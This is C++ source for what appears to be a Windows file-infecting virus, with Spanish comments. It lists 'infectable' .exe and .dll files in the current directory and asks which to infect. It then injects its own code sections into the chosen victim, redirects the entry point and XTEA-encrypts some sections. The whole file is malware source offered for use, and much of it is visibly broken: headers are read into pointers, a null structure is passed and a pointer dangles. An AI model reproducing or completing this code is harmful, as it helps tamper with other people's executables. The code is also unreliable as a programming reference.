#include <iostream>
#include <fstream>
#include <string> // Asegúrate de incluir esto
#include <windows.h>
#include <vector>
#include <filesystem>
#include <winnt.h>
#include <cstring> // Para std::strcmp
PIMAGE_DOS_HEADER dosHeader;
PIMAGE_NT_HEADERS nt_headers_g;
IMAGE_FILE_HEADER fileHeader;
typedef struct {
    void* file_handle;
    void* file_map_handle;
    unsigned char* file_mem_buffer;
} file_info, * pfile_info;
DWORD GetTextSectionRVA(const std::string& filePath, DWORD& textSectionSize);
DWORD GetDataSectionRVA(const std::string& filePath, DWORD& dataSectionSize);
DWORD GetRdataSectionRVA(const std::string& filePath, DWORD& rdataSectionSize);
bool LoadOptionalHeader(const std::string& filePath, _IMAGE_OPTIONAL_HEADER* optionalHeader) {
    // Abre el archivo en modo binario
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        std::cerr << "Error al abrir el archivo: " << filePath << std::endl;
        return false;
    }

    // Leer el encabezado DOS
    
    file.read(reinterpret_cast<char*>(&dosHeader), sizeof(dosHeader));

    // Verificar si el archivo es un ejecutable válido
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cerr << "No es un archivo PE válido." << std::endl;
        return false;
    }

    // Mover el puntero al encabezado del archivo PE
    file.seekg(dosHeader->e_lfanew, std::ios::beg);

    // Leer el encabezado PE
    DWORD peSignature;
    file.read(reinterpret_cast<char*>(&peSignature), sizeof(peSignature));

    // Verificar la firma PE
    if (peSignature != IMAGE_NT_SIGNATURE) {
        std::cerr << "No es un archivo PE válido." << std::endl;
        return false;
    }

    // Leer la cabecera del archivo
    
    file.read(reinterpret_cast<char*>(&fileHeader), sizeof(fileHeader));

    // Leer el encabezado opcional
    file.read(reinterpret_cast<char*>(optionalHeader), sizeof(_IMAGE_OPTIONAL_HEADER));

    // Cerrar el archivo
    file.close();

    // Si todo salió bien, retornar true
    return true;
}
void PrintError(const char* message) {
    std::cerr << message << std::endl;
    exit(EXIT_FAILURE);
}
DWORD align_to_boundary(DWORD value, DWORD alignment) {
    return (value + (alignment - 1)) & ~(alignment - 1);
}


// Función auxiliar para verificar si una cadena termina con un sufijo
bool endsWith(const std::string& str, const std::string& suffix) {
    if (str.length() < suffix.length()) {
        return false;
    }
    return str.compare(str.length() - suffix.length(), suffix.length(), suffix) == 0;
}
const wchar_t* StringToWchar(const std::string& str) {
    // Convert std::string to std::wstring
    std::wstring wstr(str.begin(), str.end());

    // Return a const wchar_t* pointer
    return wstr.c_str();
}

bool map_file(std::string file_name, unsigned int stub_size, bool append_mode, pfile_info mapped_file_info);


bool map_file(std::string file_name, unsigned int stub_size, bool append_mode, pfile_info mapped_file_info) {
    void* file_handle = CreateFile(StringToWchar(file_name), GENERIC_READ | GENERIC_WRITE, 0,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file_handle == INVALID_HANDLE_VALUE) {
        wprintf(L"Could not open %s", file_name);
        return false;
    }
    unsigned int file_size = GetFileSize(file_handle, NULL);
    if (file_size == INVALID_FILE_SIZE) {
        wprintf(L"Could not get file size for %s", file_name);
        return false;
    }
    if (append_mode == true) {
        file_size += (stub_size + sizeof(DWORD_PTR));
    }
    void* file_map_handle = CreateFileMapping(file_handle, NULL, PAGE_READWRITE, 0,
        file_size, NULL);
    if (file_map_handle == NULL) {
        wprintf(L"File map could not be opened");
        CloseHandle(file_handle);
        return false;
    }
    void* file_mem_buffer = MapViewOfFile(file_map_handle, FILE_MAP_WRITE, 0, 0, file_size);
    if (file_mem_buffer == NULL) {
        wprintf(L"Could not map view of file");
        CloseHandle(file_map_handle);
        CloseHandle(file_handle);
        return false;
    }
    mapped_file_info->file_handle = file_handle;
    mapped_file_info->file_map_handle = file_map_handle;
    mapped_file_info->file_mem_buffer = (unsigned char*)file_mem_buffer;
    return true;
}
// Function to convert std::string to const wchar_t*


unsigned int swap_endianess(unsigned int value) {
    return ((value >> 24) & 0xFF) | // Move byte 3 to byte 0
        ((value >> 8) & 0xFF00) | // Move byte 2 to byte 1
        ((value << 8) & 0xFF0000) | // Move byte 1 to byte 2
        ((value << 24) & 0xFF000000); // Move byte 0 to byte 3
}
//Reference: http://www.codeproject.com/KB/system/inject2exe.aspx
PIMAGE_SECTION_HEADER add_section(const char* section_name, unsigned int section_size, void* image_addr) {
    dosHeader = (PIMAGE_DOS_HEADER)image_addr; // Esto es correcto

    if (dosHeader->e_magic != 0x5A4D) {
        wprintf(L"Could not retrieve DOS header from %p", image_addr);
        return NULL;
    }

    // Declaración de la variable nt_headers
    nt_headers_g = (PIMAGE_NT_HEADERS)((DWORD_PTR)dosHeader + dosHeader->e_lfanew);

    if (nt_headers_g->OptionalHeader.Magic != 0x010B) {
        wprintf(L"Could not retrieve NT header from %p", dosHeader);
        return NULL;
    }

    const int name_max_length = 8;
    PIMAGE_SECTION_HEADER last_section = IMAGE_FIRST_SECTION(nt_headers_g) + (nt_headers_g->FileHeader.NumberOfSections - 1);
    PIMAGE_SECTION_HEADER new_section = IMAGE_FIRST_SECTION(nt_headers_g) + (nt_headers_g->FileHeader.NumberOfSections);
    memset(new_section, 0, sizeof(IMAGE_SECTION_HEADER));

    new_section->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
    memcpy(new_section->Name, section_name, name_max_length);
    new_section->Misc.VirtualSize = section_size;

    new_section->PointerToRawData = align_to_boundary(last_section->PointerToRawData + last_section->SizeOfRawData,
        nt_headers_g->OptionalHeader.FileAlignment);
    new_section->SizeOfRawData = align_to_boundary(section_size, nt_headers_g->OptionalHeader.SectionAlignment);

    new_section->VirtualAddress = align_to_boundary(last_section->VirtualAddress + last_section->Misc.VirtualSize,
        nt_headers_g->OptionalHeader.SectionAlignment);

    nt_headers_g->OptionalHeader.SizeOfImage = new_section->VirtualAddress + new_section->Misc.VirtualSize;
    nt_headers_g->FileHeader.NumberOfSections++;

    return new_section;
}
void copy_stub_instructions(PIMAGE_SECTION_HEADER section, void* image_addr, void* stub_addr, unsigned int stub_size) {
 
    memcpy(((unsigned char*)image_addr + section->PointerToRawData), stub_addr, stub_size);
}
void change_file_oep(PIMAGE_NT_HEADERS nt_headers, PIMAGE_SECTION_HEADER section) {
    unsigned int file_address = section->PointerToRawData;
    PIMAGE_SECTION_HEADER current_section = IMAGE_FIRST_SECTION(nt_headers);
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
        if (file_address >= current_section->PointerToRawData &&
            file_address < (current_section->PointerToRawData + current_section->SizeOfRawData)) {
            file_address -= current_section->PointerToRawData;
            file_address += (nt_headers->OptionalHeader.ImageBase + current_section->VirtualAddress);
            break;
        }
        ++current_section;
    }
    nt_headers->OptionalHeader.AddressOfEntryPoint = file_address - nt_headers->OptionalHeader.ImageBase;
}
//Encryption/decryption routines modified from http://en.wikipedia.org/wiki/XTEA
void encrypt(unsigned int num_rounds, unsigned int blocks[2], unsigned int const key[4]) {
    const unsigned int delta = 0x9E3779B9;
    unsigned int sum = 0;
    for (unsigned int i = 0; i < num_rounds; ++i) {
        blocks[0] += (((blocks[1] << 4) ^ (blocks[1] >> 5)) + blocks[1]) ^ (sum + key[sum & 3]);
        sum += delta;
        blocks[1] += (((blocks[0] << 4) ^ (blocks[0] >> 5)) + blocks[0]) ^ (sum + key[(sum >> 11) & 3]);
    }
}

void encrypt_file(PIMAGE_NT_HEADERS nt_headers, const std::string& filePath, const std::string& outputfilePath) {

    // Open file in binary mode
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        PrintError("Cannot open file");
        return;
    }

    // Get file size
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    // Read entire file into memory
    std::vector<unsigned char> fileBuffer(fileSize);
    file.read(reinterpret_cast<char*>(fileBuffer.data()), fileSize);
    file.close();

    // Iterate through sections to encrypt
    PIMAGE_SECTION_HEADER current_section = IMAGE_FIRST_SECTION(nt_headers);
    const char* excluded_sections[] = { ".rdata", ".rsrc", ".data", ".text" };
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
        int excluded = 1;
        for (int j = 0; j < sizeof(excluded_sections) / sizeof(excluded_sections[0]); ++j)
            excluded &= strcmp(excluded_sections[j], (char*)current_section->Name);

        if (excluded != 0) {
            unsigned char* section_start =
                fileBuffer.data() + current_section->PointerToRawData;
            unsigned char* section_end = section_start + current_section->SizeOfRawData;

            // Encryption key and rounds
            const unsigned int num_rounds = 32;
            const unsigned int key[] = { 0x12345678, 0xAABBCCDD, 0x10101010, 0xF00DBABE };

            // Encrypt section in 8-byte blocks
            for (unsigned char* k = section_start; k < section_end; k += 8) {
                unsigned int block1 = (*k << 24) | (*(k + 1) << 16) | (*(k + 2) << 8) | *(k + 3);
                unsigned int block2 = (*(k + 4) << 24) | (*(k + 5) << 16) | (*(k + 6) << 8) | *(k + 7);
                unsigned int full_block[] = { block1, block2 };
                encrypt(num_rounds, full_block, key);
                full_block[0] = swap_endianess(full_block[0]);
                full_block[1] = swap_endianess(full_block[1]);
                memcpy(k, full_block, sizeof(full_block));
            }
        }
        current_section++;
    }

    // Write the modified buffer back to the output file
    std::ofstream outputFile(outputfilePath, std::ios::binary);
    outputFile.write(reinterpret_cast<const char*>(fileBuffer.data()), fileBuffer.size());
    outputFile.close();
}


DWORD GetTextSectionRVA(const std::string& filePath, DWORD& textSectionSize) {

    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        PrintError("Cannot open file");
    }
   
    
    file.read(reinterpret_cast<char*>(&dosHeader), sizeof(IMAGE_DOS_HEADER));
    if (!file) {
        PrintError("Error reading DOS header");
    }

    file.seekg(dosHeader->e_lfanew, std::ios::beg);
    IMAGE_NT_HEADERS ntHeaders;
    file.read(reinterpret_cast<char*>(&ntHeaders), sizeof(IMAGE_NT_HEADERS));
    if (!file) {
        PrintError("Error reading PE header");
    }
    std::cout << "hola" << std::endl;
    std::vector<IMAGE_SECTION_HEADER> sections(ntHeaders.FileHeader.NumberOfSections);
    file.read(reinterpret_cast<char*>(sections.data()), sizeof(IMAGE_SECTION_HEADER) * ntHeaders.FileHeader.NumberOfSections);
    if (!file) {
        PrintError("Error reading section headers");
    }

    for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; ++i) {
        if (strcmp(reinterpret_cast<const char*>(sections[i].Name), ".text") == 0) {
            textSectionSize = sections[i].Misc.VirtualSize;
            return sections[i].PointerToRawData; // Devuelve el offset físico en el archivo
        }
    }

    PrintError(".text section not found");
    return 0;
}
DWORD GetDataSectionRVA(const std::string& filePath, DWORD& dataSectionSize) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        PrintError("Cannot open file");
    }

    
    file.read(reinterpret_cast<char*>(&dosHeader), sizeof(IMAGE_DOS_HEADER));
    if (!file) {
        PrintError("Error reading DOS header");
    }

    file.seekg(dosHeader->e_lfanew, std::ios::beg);
    IMAGE_NT_HEADERS ntHeaders;
    file.read(reinterpret_cast<char*>(&ntHeaders), sizeof(IMAGE_NT_HEADERS));
    if (!file) {
        PrintError("Error reading PE header");
    }

    std::vector<IMAGE_SECTION_HEADER> sections(ntHeaders.FileHeader.NumberOfSections);
    file.read(reinterpret_cast<char*>(sections.data()), sizeof(IMAGE_SECTION_HEADER) * ntHeaders.FileHeader.NumberOfSections);
    if (!file) {
        PrintError("Error reading section headers");
    }

    for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; ++i) {
        if (strcmp(reinterpret_cast<const char*>(sections[i].Name), ".data") == 0) {
            dataSectionSize = sections[i].Misc.VirtualSize;
            return sections[i].PointerToRawData; // Devuelve el offset físico en el archivo
        }
    }

    PrintError(".text section not found");
    return 0;
}
DWORD GetRdataSectionRVA(const std::string& filePath, DWORD& rdataSectionSize) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        PrintError("Cannot open file");
    }

    
    file.read(reinterpret_cast<char*>(&dosHeader), sizeof(IMAGE_DOS_HEADER));
    if (!file) {
        PrintError("Error reading DOS header");
    }

    file.seekg(dosHeader->e_lfanew, std::ios::beg);

    file.read(reinterpret_cast<char*>(&nt_headers_g), sizeof(IMAGE_NT_HEADERS));
    if (!file) {
        PrintError("Error reading PE header");
    }

    std::vector<IMAGE_SECTION_HEADER> sections(nt_headers_g->FileHeader.NumberOfSections);
    file.read(reinterpret_cast<char*>(sections.data()), sizeof(IMAGE_SECTION_HEADER) * nt_headers_g->FileHeader.NumberOfSections);
    if (!file) {
        PrintError("Error reading section headers");
    }

    for (int i = 0; i < nt_headers_g->FileHeader.NumberOfSections; ++i) {
        if (strcmp(reinterpret_cast<const char*>(sections[i].Name), ".rdata") == 0) {
            rdataSectionSize = sections[i].Misc.VirtualSize;
            return sections[i].PointerToRawData; // Devuelve el offset físico en el archivo
        }
    }

    PrintError(".rdata section not found");
    return 0;
}
void WriteReport(const std::vector<std::string>& files, const std::string& reportFilePath) {
    std::ofstream reportFile(reportFilePath);
    if (!reportFile) {
        PrintError("Cannot open report file");
    }

    for (const auto& file : files) {
        reportFile << file << std::endl;
    }

    reportFile.close();
    std::cout << "Report written to " << reportFilePath << std::endl;
}
std::vector<std::string> FindInfectableFiles(const std::string& directory, const std::string& nameFilter, size_t sizeFilter) {
    std::vector<std::string> infectableFiles;

    for (const auto& entry : std::filesystem::directory_iterator(directory)) {
        if (entry.is_regular_file()) {
            const std::string& filePath = entry.path().string();
            const auto fileSize = entry.file_size();

            // Filtrar por extensión, nombre y tamaño
            if ((endsWith(filePath, ".exe") || endsWith(filePath, ".dll")) &&
                (nameFilter.empty() || filePath.find(nameFilter) != std::string::npos) &&
                (sizeFilter == 0 || fileSize <= sizeFilter)) {
                infectableFiles.push_back(filePath);
            }
        }
    }
    return infectableFiles;
}
// Función auxiliar para verificar si una cadena termina con un sufijo

int main(int argc, char* argv[]) {
    std::string nameFilter;
    size_t sizeFilter = 0;
    std::string reportFilePath = "report.txt"; // Ruta del archivo de reportes
    std::string selfPath;

    std::cout << "Introduce la ruta del archivo actual (self): ";
    std::cin >> selfPath;  // Leer la ruta del archivo self (actual ejecutable)

    // Leer el self-code (actual ejecutable) en memoria
    std::ifstream selfFile(selfPath, std::ios::binary | std::ios::ate);
    if (!selfFile) {
        std::cerr << "Error al abrir el archivo: " << selfPath << std::endl;
        return 1;
    }
  
    DWORD textSectionSize = 0;
    DWORD textSectionOffset = GetTextSectionRVA(selfPath, textSectionSize);
 
    DWORD dataSectionSize = 0;
    DWORD dataSectionOffset = GetDataSectionRVA(selfPath, dataSectionSize);

    DWORD rdataSectionSize = 0;
    DWORD rdataSectionOffset = GetRdataSectionRVA(selfPath, rdataSectionSize);

    // Procesar argumentos
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-name" && (i + 1) < argc) {
            nameFilter = argv[++i];
        }
        else if (arg == "-size" && (i + 1) < argc) {
            sizeFilter = std::stoul(argv[++i]);
        }
    }

    // Obtener la ruta del directorio actual
    std::string currentDirectory = std::filesystem::current_path().string();
    std::cout << "Searching for infectable files in: " << currentDirectory << std::endl;

    // Buscar archivos infectables
    auto infectableFiles = FindInfectableFiles(currentDirectory, nameFilter, sizeFilter);
    if (infectableFiles.empty()) {
        std::cout << "No infectable files found in the current directory." << std::endl;
        return EXIT_SUCCESS;
    }

    // Escribir el reporte
    WriteReport(infectableFiles, reportFilePath);

    std::cout << "Infectable files found:" << std::endl;
    for (size_t i = 0; i < infectableFiles.size(); ++i) {
        std::cout << i + 1 << ": " << infectableFiles[i] << std::endl;
    }

    // Seleccionar un archivo para inyectar
    int choice;
    std::cout << "Select a file to infect (1-" << infectableFiles.size() << "): ";
    std::cin >> choice;

    if (choice < 1 || choice > infectableFiles.size()) {
        std::cerr << "Invalid choice." << std::endl;
        return EXIT_FAILURE;
    }
    std::string victimFilePath = infectableFiles[choice - 1];
    if (victimFilePath == selfPath) {
        std::cerr << "Cannot infect own file" << std::endl;
        return EXIT_FAILURE;
    }

    // Aquí defines la ruta del archivo de salida
    std::string outputFilePath = victimFilePath + "_infected.exe"; // Modificar el nombre del archivo de salida según necesites

    // Abrir archivo de salida para escritura
    std::ofstream outFile(outputFilePath, std::ios::binary);
    if (!outFile) {
        std::cerr << "Error al abrir el archivo de salida: " << outputFilePath << std::endl;
        return 1;
    }

    DWORD stub_size = 0;
    pfile_info mapped_file_info = {}; // Inicializa todos los miembros a valores predeterminados (0 o NULL)

    bool mapped = TRUE;

     mapped = map_file(victimFilePath, stub_size, std::ios::in | std::ios::out, mapped_file_info);

    // Verificar si el archivo se mapeó correctamente
    if (!mapped) {
        std::cerr << "Error al mapear el archivo: " << victimFilePath << std::endl;
        return EXIT_FAILURE;
    }

    const char* section_name = ".text";

    // Agregar la sección .text
    _IMAGE_OPTIONAL_HEADER image_optional_header = {};

    // Supongamos que necesitas cargar el encabezado de un archivo PE
    if (LoadOptionalHeader(victimFilePath, &image_optional_header)) {
        // Ahora puedes usar image_optional_header con seguridad
    }
    else {
        std::cerr << "Error al cargar el encabezado opcional." << std::endl;
    }

    PIMAGE_SECTION_HEADER lastSection = add_section(section_name, textSectionSize, (void*)image_optional_header.ImageBase);
    copy_stub_instructions(lastSection, (void*)textSectionOffset, (void*)textSectionSize, textSectionSize);
    change_file_oep(nt_headers_g, lastSection);

    // Escribir la sección .text al archivo de salida
    outFile.write(reinterpret_cast<const char*>(lastSection), textSectionSize);

    // Agregar la sección .data
    section_name = ".data";
    lastSection = add_section(section_name, dataSectionSize, (void*)image_optional_header.ImageBase);
    copy_stub_instructions(lastSection, (void*)dataSectionOffset, (void*)dataSectionSize, dataSectionSize);

    // Escribir la sección .data al archivo de salida
    outFile.write(reinterpret_cast<const char*>(lastSection), dataSectionSize);

    // Agregar la sección .rdata
    section_name = ".rdata";
    lastSection = add_section(section_name, rdataSectionSize, (void*)image_optional_header.ImageBase);
    copy_stub_instructions(lastSection, (void*)rdataSectionOffset, (void*)rdataSectionSize, rdataSectionSize);

    // Escribir la sección .rdata al archivo de salida
    outFile.write(reinterpret_cast<const char*>(lastSection), rdataSectionSize);

    // Cerrar el archivo de salida
    outFile.close();


    // Aquí podrías inicializar target_file antes de usarlo
    // Por ejemplo, si tienes un valor por defecto o si tienes una función que lo inicializa

    encrypt_file(nt_headers_g, victimFilePath, outputFilePath);

    std::cout << "Secciones inyectadas y archivo modificado guardado en: " << outputFilePath << std::endl;
    return 0;
}